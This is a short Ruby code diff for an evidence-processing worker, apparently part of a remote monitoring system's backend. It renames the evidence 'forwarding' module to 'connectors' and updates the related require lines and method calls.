@@ -7,13 +7,13 @@ if File.directory?(Dir.pwd + '/lib/rcs-worker-release')
   require 'rcs-db-release/db_layer'
   require 'rcs-db-release/grid'
   require 'rcs-db-release/alert'
-  require 'rcs-db-release/forward'
+  require 'rcs-db-release/connectors'
 else
   require 'rcs-db/config'
   require 'rcs-db/db_layer'
   require 'rcs-db/grid'
   require 'rcs-db/alert'
-  require 'rcs-db/forward'
+  require 'rcs-db/connectors'
 end
 
 require_relative 'call_processor'
@@ -147,11 +147,11 @@ class InstanceWorker
                   RCS::DB::Alerting.new_evidence(evidence) unless evidence.nil?
 
                   # forward the evidence to connectors (if any)
-                  RCS::DB::Forwarding.new_evidence(evidence) unless evidence.nil?
+                  RCS::DB::Connectors.new_evidence(evidence) unless evidence.nil?
                 end
                 
                 # forward raw evidence
-                #RCS::DB::Forwarding.new_raw(raw_id, index, @agent, evidence_id)
+                #RCS::DB::Connectors.new_raw(raw_id, index, @agent, evidence_id)
                 
                 # delete raw evidence
                 RCS::DB::GridFS.delete(raw_id, "evidence")
